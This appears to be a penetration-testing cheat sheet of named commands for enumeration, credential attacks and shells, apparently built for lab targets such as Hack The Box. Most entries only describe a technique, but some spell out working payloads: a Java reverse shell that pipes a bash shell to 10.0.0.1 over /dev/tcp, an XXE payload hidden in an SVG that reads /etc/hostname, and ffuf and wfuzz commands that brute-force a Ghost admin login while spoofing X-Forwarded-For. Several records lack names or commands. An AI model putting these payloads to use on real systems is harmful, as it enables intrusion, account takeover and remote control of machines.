commands.Name: Start System Service
commands.Description: Starts a specified service using systemctl

commands.Name: Nmap Vulnerability Scan
commands.Description: Performs vulnerability scan on ports 80 and 443 of 192.168.192.13 using Nmap scripts

commands.Name: PHP Filter Base64 Payload
commands.Description: Uses PHP filter to encode a resource in base64, potentially for data exfiltration

commands.Name: Data URI Command Execution
commands.Description: Executes a base64-encoded PHP payload via data URI to run system command 'uname -a'

commands.Name: Python HTTP Server
commands.Description: Creates a simple python http server on port 80

commands.Name: Nmap UDP SNMP Scan
commands.Description: Scans for open UDP port 161 (SNMP) across 192.168.50.1-254, saving results to open-snmp.txt

commands.Name: Onesixtyone SNMP Brute Force
commands.Description: Performs SNMP community string brute-forcing using a community list against specified IPs

commands.Name: SNMPwalk Public Community
commands.Description: Enumerates SNMP data using public community string on 192.168.50.151 with SNMPv1

commands.Name: SNMPwalk LAN Manager Users
commands.Description: Enumerates LAN Manager user information via SNMP on 192.168.50.151 using OID 1.3.6.1.4.1.77.1.2.25

commands.Name: SNMPwalk Running Processes
commands.Description: Enumerates running processes via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.25.4.2.1.2

commands.Name: SNMPwalk Installed Software
commands.Description: Enumerates installed software via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.25.6.3.1.2

commands.Name: SNMPwalk TCP Connections
commands.Description: Enumerates TCP connections via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.6.13.1.3

commands.Name: Telnet SMTP Connect
commands.Description: Initiates a Telnet connection to port 25 (SMTP) on 192.168.50.8

commands.Name: Enable Telnet Client
commands.Description: Enables the Telnet Client feature on a Windows system using DISM

commands.Name: Test-NetConnection SMTP
commands.Description: Tests connectivity to port 25 (SMTP) on 192.168.50.8 using PowerShell

commands.Name: Netcat SMTP Connect
commands.Description: Establishes a connection to port 25 (SMTP) on 192.168.50.8 with verbose output

commands.Name: Enum4linux Multi-IP Scan
commands.Description: Runs enum4linux against a list of specified IPs in the 192.168.192.0/24 subnet

commands.Name: Enum4linux Verbose Scan
commands.Description: Runs enum4linux in verbose mode to show underlying commands

commands.Name: Enum4linux All Options
commands.Description: Runs all enum4linux options except dictionary-based share name guessing

commands.Name: Enum4linux User List
commands.Description: Lists usernames if the server allows (RestrictAnonymous = 0)

commands.Name: Enum4linux User List with Credentials
commands.Description: Lists all users using provided credentials, bypassing RestrictAnonymous

commands.Name: Enum4linux Default RID Scan
commands.Description: Pulls usernames from default RID range (500-550,1000-1050)

commands.Name: Enum4linux Custom RID Scan
commands.Description: Pulls usernames using a custom RID range (600-660)

commands.Name: Enum4linux Group List
commands.Description: Lists groups, with optional username and password support

commands.Name: Enum4linux Share List
commands.Description: Lists Windows shares, with optional username and password support

commands.Name: Enum4linux Share Dictionary Attack
commands.Description: Performs dictionary attack on shares if share list retrieval is blocked

commands.Name: Enum4linux OS Info
commands.Description: Pulls OS information using smbclient, including service pack version

commands.Name: Enum4linux Printer Info
commands.Description: Pulls information about printers known to the target device

commands.Name: Net View Shares
commands.Description: Lists all shared resources on the target domain controller dc01

commands.Name: Nmap SMB OS Discovery
commands.Description: Scans for SMB services on ports 139 and 445 with OS discovery script on a single host

commands.Name: NBTScan
commands.Description: Scans for NetBIOS information on the 192.168.50.0/24 network

commands.Name: Nmap SMB Scan
commands.Description: Scans for SMB services on ports 139 and 445 across a subnet, saving output to smb.txt

commands.Name: Nmap SYN Scan
commands.Description: Port scanning with nmap

commands.Name: Netcat Port Scan
commands.Description: Port scanning with netcat

commands.Name: Netcat UDP Port Scan
commands.Description: UDP Port scanning with netcat

commands.Name: dnsenum
commands.Description: Attempts to retrieve the dns records for the given domain

commands.Name: Evil-WinRM
commands.Description: Attempts to connect to the windows remote management service

commands.Name: Hashcrack
commands.Description: Runs the hashcat command against hashes.txt using the rockyou.txt file and applies the best64.rule transformations to it

commands.Name: GetNPUsers - AS-REPRoast impacket-GetNPUsers
commands.Description: Attempts to enumerate and extract Kerberos AS-REP hashes for user accounts listed in the ./users file

commands.Name: LDAP Search get domain name with anonymous login
commands.Description: Get's the default naming context and displays the domain name

commands.Name: Bash Reverse Shell
commands.Description: Creates a reverse shell using bash, tested on Ubuntu 10.10 checkout https://www.revshells.com for more robust shell creation

commands.Name: Perl Reverse Shell
commands.Description: A short, feature-free Perl reverse shell connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation

commands.Name: Python Reverse Shell
commands.Description: A Python reverse shell for Linux with Python 2.7, connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation

commands.Name: PHP Reverse Shell
commands.Description: A PHP reverse shell assuming TCP connection uses file descriptor 3 (try 4, 5, 6 if needed) checkout https://www.revshells.com for more robust shell creation

commands.Name: Ruby Reverse Shell
commands.Description: A Ruby reverse shell connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation

commands.Name: Netcat Reverse Shell
commands.Description: A Netcat reverse shell, requires -e option support checkout https://www.revshells.com for more robust shell creation

commands.Name: Netcat FIFO Reverse Shell
commands.Description: An alternative Netcat reverse shell using FIFO for systems without -e option checkout https://www.revshells.com for more robust shell creation

commands.Name: Java Reverse Shell
commands.Description: A Java reverse shell connecting to a specified IP and port (untested) checkout https://www.revshells.com for more robust shell creation
commands.Command: r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()

commands.Name: Xterm Reverse Shell
commands.Description: An xterm reverse shell connecting to a specified IP on port 6001 checkout https://www.revshells.com for more robust shell creation

commands.Name: Xnest Setup
commands.Description: Starts an X-Server to catch incoming xterm on port 6001 (run on your system) checkout https://www.revshells.com for more robust shell creation

commands.Name: Xhost Authorization
commands.Description: Authorizes the target to connect to your X-Server (run on your system)

commands.Description: Look for cloud buckets by company names and variations with bucket keywords

commands.Name: XXE with SSRF
commands.Description: Retrieve data from internal EC2 instance using SSRF

commands.Description: Embed XXE in an SVG image
commands.Command: <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

commands.Name: hydra
commands.Description: Brute force login attempts

commands.Name: ffuf Brute
commands.Description: Brute force with ffuf
commands.Command: ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ -u "http://10.10.11.24:8008/ghost/api/admin/session" -X POST -d '{"username":"htbuserFUZZ","password":"secret"}' -H "Host: 10.10.11.24:8008" -H "Accept: text/plain, */*; q=0.01" -H "X-Forwarded-For: htbuserFUZZ" -H "X-Requested-With: XMLHttpRequest" -H "X-Ghost-Version: 5.78" -H "App-Pragma: no-cache" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36" -H "Content-Type: application/json;charset=UTF-8" -H "Origin: http://10.10.11.24:8008" -H "Referer: http://10.10.11.24:8008/ghost/" -H "Accept-Encoding: gzip, deflate, br" -H "Accept-Language: en-US,en;q=0.9" -H "Cookie: connect.sid=s%3Av28_oZV8lijLRwlgUQWxt6ccnksDKouo.sb4qxncwYoE0dnj3ARiTb8OnJitRF%2FvDttKjE0nSX%2FM" -H "Connection: close" -mr "There is no user with that email address."

commands.Name: wfuzz Brute
commands.Description: Brute force with wfuzz
commands.Command: wfuzz -z range,1-100000 -d "username=htbuserFUZZ&password=secret" -H "X-Forwarded-For: htbuserFUZZ" --hs "There is no user with that email address." -u "http://10.10.11.24:8008/ghost/api/admin/session"
